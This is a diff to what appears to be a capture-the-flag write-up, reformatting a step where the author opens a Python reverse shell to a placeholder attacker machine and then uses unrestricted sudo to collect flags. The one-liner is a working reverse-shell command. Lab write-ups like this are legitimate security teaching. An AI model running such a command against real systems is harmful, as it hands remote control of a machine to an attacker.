@@ -43,8 +43,10 @@ We can read the **clue.txt** file using the same method as before.
 
 Since Python is installed on the remote machine, I used a python reverse shell and started a netcat listener on the attacking machine. 
 
-> python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_MACHINE_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'  
-* Use pty.spawn("/bin/bash") at the end for spawning a bash shell insdead of a sh.  
+```python
+python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("MY_MACHINE_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+```
+* Use pty.spawn("/bin/bash") at the end for spawning a bash shell insdead of a sh. 
 
 We get a reverse shell as www-data user. After checking the SUDO permissions, we see that this user has permission to run any command with sudo privileges, which makes it really easy for us to find the other two flags on the system.  
 
